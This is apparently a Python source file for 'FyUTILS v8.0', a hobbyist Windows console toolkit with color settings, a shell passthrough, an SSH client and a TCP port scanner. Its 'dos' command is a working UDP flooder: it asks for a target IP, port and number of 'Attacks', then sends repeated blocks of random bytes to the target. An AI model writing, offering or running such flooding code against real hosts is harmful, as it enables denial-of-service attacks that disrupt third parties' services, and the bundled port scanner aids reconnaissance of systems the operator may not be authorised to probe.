import os
import platform
import random
import socket
import time
import getpass
import keyboard
import paramiko
import requests
from datetime import datetime
from colorama import Fore, init
init(convert=True)


def init():
    try:
        open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "r")
    except:
        print("Welcome to the FyUTILS installer!")
        pipinstall = input("Do you want to install the PIP librarys you need for FyUTILS? (Y/N): ")
        if pipinstall == "Y":
            print("Installing PIP librarys...")
            time.sleep(2)
            os.system("pip install keyboard")
            os.system("pip install datetime")
            os.system("pip install paramiko")
            os.system("pip install requests")
            os.system("pip install colorama")

        print("")
        print("Starting installation...")
        os.system("cd C:\\Users\\" + os.getlogin() + "\\")
        os.system("mkdir FyUTILS")
        os.system("echo The config was created! > config.txt")
        setlines = str("green" + "\n" +
                       "gray" + "\n" +
                       "white" + "\n"
                       )
        open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "w").writelines(setlines)
        time.sleep(1)
        print("Installation finished! Starting FyUTILS...")
        time.sleep(3)
        

def color(args):
    color = open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "r").readlines()[0]

    if args == 1:
        return color

    if color == "aqua" + "\n":
        return Fore.CYAN
    if color == "green" + "\n":
        return Fore.GREEN
    if color == "red" + "\n":
        return Fore.RED
    if color == "yellow" + "\n":
        return Fore.YELLOW
    if color == "pink" + "\n":
        return Fore.MAGENTA
    if color == "white" + "\n":
        return Fore.WHITE
    if color == "gray" + "\n":
        return Fore.LIGHTBLACK_EX
    if color == "blue" + "\n":
        return Fore.BLUE
    if color == "lime" + "\n":
        return Fore.LIGHTGREEN_EX
    else:
        return Fore.WHITE


def accent(args):
    accent = open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "r").readlines()[1]

    if args == 1:
        return accent

    if accent == "aqua" + "\n":
        return Fore.CYAN
    if accent == "green" + "\n":
        return Fore.GREEN
    if accent == "red" + "\n":
        return Fore.RED
    if accent == "yellow" + "\n":
        return Fore.YELLOW
    if accent == "pink" + "\n":
        return Fore.MAGENTA
    if accent == "white" + "\n":
        return Fore.WHITE
    if accent == "gray" + "\n":
        return Fore.LIGHTBLACK_EX
    if accent == "blue" + "\n":
        return Fore.BLUE
    if accent == "lime" + "\n":
        return Fore.LIGHTGREEN_EX
    else:
        return Fore.WHITE


def textcol(args):
    textcol = open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "r").readlines()[2]

    if args == 1:
        return textcol

    if textcol == "aqua":
        return Fore.CYAN
    if textcol == "green":
        return Fore.GREEN
    if textcol == "red":
        return Fore.RED
    if textcol == "yellow":
        return Fore.YELLOW
    if textcol == "pink":
        return Fore.MAGENTA
    if textcol == "white":
        return Fore.WHITE
    if textcol == "gray":
        return Fore.LIGHTBLACK_EX
    if textcol == "blue":
        return Fore.BLUE
    if textcol == "lime":
        return Fore.LIGHTGREEN_EX
    else:
        return Fore.WHITE


def now():
    now = datetime.now()
    current_time = now.strftime("[%H:%M:%S] ")
    return color(0) + current_time + Fore.WHITE


init()

user = os.getlogin()
device = platform.node()
fullscreen = False
onlinemode = True
try:
    publicip = requests.get("https://api.ipify.org/").content.decode("UTF8")
except:
    onlinemode = False
privateip = socket.gethostbyname(socket.gethostname())
processor = platform.processor()
time.sleep(0.2)

for i in range(99999):
    os.system("cls")
    print(color(0) + "  __________ " + textcol(0) + "             " + color(
        0) + "   _____  __   ________   ________   ______       ________  ")
    time.sleep(0.05)
    print(color(0) + "  ___  ____/ " + textcol(0) + "   _____  __ " + color(
        0) + "   __  / / /   ___  __/   ____  _/   ___  /       __  ___/  ")
    time.sleep(0.05)
    print(color(0) + "  __  /_     " + textcol(0) + "   __  / / / " + color(
        0) + "   _  / / /    __  /       __  /     __  /        _____ \   ")
    time.sleep(0.05)
    print(color(0) + "  _  __/     " + textcol(0) + "   _  /_/ /  " + color(
        0) + "   / /_/ /     _  /       __/ /      _  /___      ____/ /   ")
    time.sleep(0.05)
    print(color(0) + "  /_/        " + textcol(0) + "   _\__, /   " + color(
        0) + "   \____/      /_/        /___/      /_____/      /____/    ")
    time.sleep(0.05)
    print(color(0) + "             " + textcol(0) + "   /____/    " + color(
        0) + "                                                            ")
    time.sleep(0.05)
    if fullscreen == False:
        print(accent(0) + "=" * 120)
    else:
        print(accent(0) + "=" * 237)
        time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Username:   " + accent(0) + "//" + "  " + Fore.LIGHTWHITE_EX + user)
    time.sleep(0.05)
    print(
        color(0) + "[VARIABLES] " + textcol(0) + "Devicename: " + accent(0) + "//" + "  " + Fore.LIGHTWHITE_EX + device)
    time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Fullscreen: " + accent(0) + "//" + "  " + Fore.LIGHTWHITE_EX + str(
        fullscreen))
    time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Onlinemode: " + accent(0) + "//" + "  " + Fore.LIGHTWHITE_EX + str(
        onlinemode))
    time.sleep(0.05)
    if onlinemode == True:
        print(color(0) + "[VARIABLES] " + textcol(0) + "Public IP:  " + accent(
            0) + "//" + "  " + Fore.LIGHTWHITE_EX + publicip)
    else:
        time.sleep(0.05)
    time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Private IP: " + accent(
        0) + "//" + "  " + Fore.LIGHTWHITE_EX + privateip)
    time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Processor:  " + accent(
        0) + "//" + "  " + Fore.LIGHTWHITE_EX + processor)
    time.sleep(0.05)
    print(color(0) + "[VARIABLES] " + textcol(0) + "Version:    " + accent(
        0) + "//" + "  " + Fore.LIGHTWHITE_EX + "FyUTILS_v8.0 - Made by NoahOnFyre")
    time.sleep(0.05)
    if fullscreen == False:
        print(accent(0) + "=" * 120)
    else:
        print(accent(0) + "=" * 237)
    print("")
    cmd = input(textcol(0) + user + color(0) + "@" + textcol(0) + device + accent(0) + "//" + color(0) + "FyUTILS" + accent(0) + " >> " + color(0))

    # Command-Tabs

    if cmd == "dos":
        sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        dosip = input(textcol(0) + "Target IP" + accent(0) + " >> " + color(0))
        time.sleep(0.05)
        dosport = int(input(textcol(0) + "Target Port" + accent(0) + " >> " + color(0)))
        time.sleep(0.05)
        dosqueries = int(input(textcol(0) + "Attacks" + accent(0) + " >> " + color(0)))
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print("")

        sckt.connect((dosip, dosport))

        print(textcol(0) + "Starting attack on: " + color(0) + dosip + ":" + str(dosport))
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
            print(now() + "Preparing attack...", end='\r')
            time.sleep(1.5)
        try:
            for i in range(dosqueries + 1):
                randombytes = random.randbytes(10) * 1000
                sckt.send(randombytes)
                print(now() + "Transferring bytecode... " + color(0) + str(i) + accent(0) + " - " + Fore.GREEN + "Target reachable", end='\r')

        except socket.gaierror:
            print(now() + "\nHost not found!")

        except socket.error:
            print(now() + "\nServer not responding!")

        except KeyboardInterrupt:
            print(now() + "\nOperation failed!")

        time.sleep(1)
        print("")
        print(now() + "Disconnecting from target...")
        sckt.close()
        time.sleep(0.6)
        print(now() + "Writing log entry...")
        time.sleep(0.2)
        print(now() + "Running post-execution steps...")
        time.sleep(1)

    if cmd == "cmd":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(textcol(0) + "Windows batch shell executor/emulator. Use 'exit' to get back to the main menu.")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(textcol(0) + "")
        for i in range(99999):
            cmdcmd = input(textcol(0) + user + color(0) + "@" + textcol(0) + device + accent(0) + "//" + color(0) + "FyUTILS-CMD" + accent(0) + " >> " + color(0))
            if cmdcmd == "exit":
                break
            print(textcol(0))
            os.system(cmdcmd)
            print(textcol(0))
        print(textcol(0))
        print(textcol(0) + "Closing FyUTILS-CMD...")
        time.sleep(2)
        time.sleep(0.05)

    if cmd == "portscan":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        porttarget = input(textcol(0) + "Target IP" + accent(0) + " >> " + color(0))
        time.sleep(0.05)
        portmax = input(textcol(0) + "Max. Port" + accent(0) + " >> " + color(0))
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        print(textcol(0) + "")
        try:

            for port in range(1, int(portmax)):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(0.001)

                print(textcol(0) + "Checking ports... " + color(0) + str(port), end='\r')
                result = s.connect_ex((porttarget, port))
                if result == 0:
                    print(textcol(0) + "Port " + color(0) + f"{port}" + textcol(0) + " is open!        ")
                s.close()
            os.system("pause")

        except KeyboardInterrupt:
            print(now() + "\nOperation failed!")
            time.sleep(1)

        except socket.gaierror:
            print(now() + "\nHost not found!")
            time.sleep(1)

        except socket.error:
            print(now() + "\nServer not responding!")
            time.sleep(1)

    if cmd == "ssh":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        sshtarget = input(textcol(0) + "Target IP/Hostname" + accent(0) + " >> " + color(0))
        time.sleep(0.05)
        sshport = int(input(textcol(0) + "Target Port" + accent(0) + " >> " + color(0)))
        time.sleep(0.05)
        sshuser = input(textcol(0) + "Username" + accent(0) + " >> " + color(0))
        time.sleep(0.05)
        sshpass = getpass.getpass(textcol(0) + "Password" + accent(0) + " >> " + "")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        print(textcol(0) + "")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(sshtarget, sshport, sshuser, sshpass)

        sshexitvar = 1000
        for i in range(sshexitvar):
            sshcommand = input("FySSH > ")
            if sshcommand == "exit":
                time.sleep(1)
                break
            stdin, stdout, stderr = ssh.exec_command(sshcommand)
            print(stdout.readlines())

    if cmd == "settings":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(color(0) + "1: " + textcol(0) + "DesignColor")
        time.sleep(0.05)
        print(color(0) + "2: " + textcol(0) + "AccentColor")
        time.sleep(0.05)
        print(color(0) + "3: " + textcol(0) + "TextColor")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        settings1 = int(input(accent(0) + "> " + color(0)))
        settings2 = input(accent(0) + "> " + color(0))
        print("\n" + textcol(0) + "Value " + color(0) + str(settings1) + textcol(0) + " was set to " + color(
            0) + settings2)
        try:
            if settings1 == 1:
                setlines = str(settings2 + "\n" +
                               str(accent(1)) + "\n" +
                               str(textcol(1)) + "\n"
                               )
                open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "w").writelines(setlines)
            if settings1 == 2:
                setlines = str(str(color(1)) + "\n" +
                               settings2 + "\n" +
                               str(textcol(1)) + "\n"
                               )
                open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "w").writelines(setlines)
            if settings1 == 3:
                setlines = str(str(color(1)) + "\n" +
                               str(accent(1)) + "\n" +
                               settings2 + "\n"
                               )
                open("C:\\Users\\" + os.getlogin() + "\\FyUTILS\\config.txt", "w").writelines(setlines)
        except FileExistsError:
            print(textcol(0) + "File does not exists!")
        except:
            print(textcol(0) + "Error.")

    if cmd == "protect":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)

    if cmd == "full":
        print("")
        if fullscreen == True:
            fullscreen = False
        else:
            fullscreen = True

        keyboard.press_and_release("f11")

    if cmd == "help":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(textcol(0) + "Help Menu")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)

    if cmd == "exit":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(textcol(0) + "FyUTILS will shutdown in 3 seconds.")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print("")
        print(textcol(0) + "Shutdown in 3", end='\r')
        time.sleep(1)
        print(textcol(0) + "Shutdown in 2", end='\r')
        time.sleep(1)
        print(textcol(0) + "Shutdown in 1")
        time.sleep(1)
        exit()

    if cmd == "restart":
        print("")
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print(textcol(0) + "FyUTILS will restart in 3 seconds.")
        time.sleep(0.05)
        if fullscreen == False:
            print(accent(0) + "=" * 120)
        else:
            print(accent(0) + "=" * 237)
        time.sleep(0.05)
        print("")
        print(textcol(0) + "Restart in 3", end='\r')
        time.sleep(1)
        print(textcol(0) + "Restart in 2", end='\r')
        time.sleep(1)
        print(textcol(0) + "Restart in 1")

    time.sleep(0.5)
exit()
